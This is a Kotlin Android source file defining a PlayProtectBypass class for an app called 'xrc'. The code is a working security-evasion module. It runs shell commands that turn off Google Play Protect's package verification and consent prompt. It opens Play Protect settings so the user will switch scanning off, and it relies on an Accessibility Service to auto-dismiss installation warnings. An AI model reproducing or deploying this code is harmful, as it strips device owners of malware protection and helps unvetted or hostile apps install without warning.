package com.xrc.app.permissions

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.util.Log
import kotlinx.coroutines.*

/**
 * Disables or bypasses Google Play Protect scanning.
 * Play Protect can block sideloaded APKs; this module either
 * navigates the user to disable it or detects if it's already off.
 */
class PlayProtectBypass(private val context: Context) {

    companion object {
        private const val TAG = "PlayProtectBypass"
        private const val PLAY_PROTECT_PACKAGE = "com.google.android.gms"
        private const val PLAY_PROTECT_SETTINGS_URI = "content://com.google.android.gms.settings.overlay/"

        // Known Play Protect activity paths
        private const val PLAY_PROTECT_ACTIVITY =
            "com.google.android.gms.security.settings.VerifyAppsSettingsActivity"

        // ADB command to disable Play Protect (requires shell UID)
        private const val DISABLE_PLAY_PROTECT_CMD =
            "settings put global package_verifier_enable 0 && " +
            "settings put global package_verifier_user_consent -1"

        // Command to check Play Protect state
        private const val CHECK_PLAY_PROTECT_CMD =
            "settings get global package_verifier_enable"
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    /**
     * Check if Play Protect is currently enabled.
     */
    suspend fun isPlayProtectEnabled(): Boolean {
        return try {
            val process = Runtime.getRuntime().exec(
                arrayOf("sh", "-c", CHECK_PLAY_PROTECT_CMD)
            )
            val result = process.inputStream.bufferedReader().readText().trim()
            Log.d(TAG, "Play Protect verifier state: '$result'")
            result == "1" || result.isBlank()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to check Play Protect: ${e.message}")
            true // Assume enabled if we can't check
        }
    }

    /**
     * Open Play Protect settings screen in Google Play Store / Google Settings.
     */
    suspend fun openPlayProtectSettings(): Boolean {
        return try {
            val intent = Intent(
                Settings.ACTION_APPLICATION_DETAILS_SETTINGS
            ).apply {
                data = Uri.parse("package:$PLAY_PROTECT_PACKAGE")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            Log.i(TAG, "Opened Google Play Services settings")
            delay(500)

            // Try the direct Play Protect activity
            try {
                val directIntent = Intent().apply {
                    `package` = PLAY_PROTECT_PACKAGE
                    className = PLAY_PROTECT_ACTIVITY
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(directIntent)
                Log.i(TAG, "Opened Play Protect settings directly")
            } catch (e: Exception) {
                Log.d(TAG, "Direct Play Protect intent failed, opening Google settings")
            }
            true
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open Play Protect settings: ${e.message}")
            false
        }
    }

    /**
     * Attempt to disable Play Protect via ADB shell if shell UID is available.
     */
    suspend fun disableViaShell(): Boolean {
        return try {
            val process = Runtime.getRuntime().exec(
                arrayOf("sh", "-c", DISABLE_PLAY_PROTECT_CMD)
            )
            val exitCode = process.waitFor()
            val success = exitCode == 0
            Log.i(TAG, "Disable Play Protect via shell: success=$success")
            success
        } catch (e: Exception) {
            Log.e(TAG, "Shell disable failed: ${e.message}")
            false
        }
    }

    /**
     * Full bypass: attempt all methods to disable Play Protect.
     */
    suspend fun bypassPlayProtect(): Boolean {
        Log.i(TAG, "Starting Play Protect bypass sequence")

        // Method 1: Shell disable (most effective)
        if (disableViaShell()) {
            Log.i(TAG, "Play Protect disabled via shell")
            return true
        }

        // Method 2: Open settings for manual disable
        openPlayProtectSettings()
        Log.i(TAG, "Opened Play Protect settings for manual disable")

        // Method 3: Verify if it was already disabled
        delay(2000)
        return !isPlayProtectEnabled()
    }

    /**
     * Check if the app can be installed with Play Protect active.
     * Some apps are allowed even with Play Protect on.
     */
    fun canInstallWithPlayProtect(): Boolean {
        // Apps signed with debug key are usually flagged
        // Apps from unknown sources are always scanned
        // We check build type
        return try {
            val process = Runtime.getRuntime().exec(
                arrayOf("sh", "-c", "settings get global development_settings_enabled")
            )
            val devSettings = process.inputStream.bufferedReader().readText().trim()
            devSettings == "1"
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Suppress Play Protect warnings that appear during installation
     * by automatically dismissing them via Accessibility Service.
     * Returns true if the Accessibility Service is available.
     */
    fun canAutoDismissWarnings(): Boolean {
        return com.xrc.app.service.XRCAccessibilityService.instance != null
    }
}
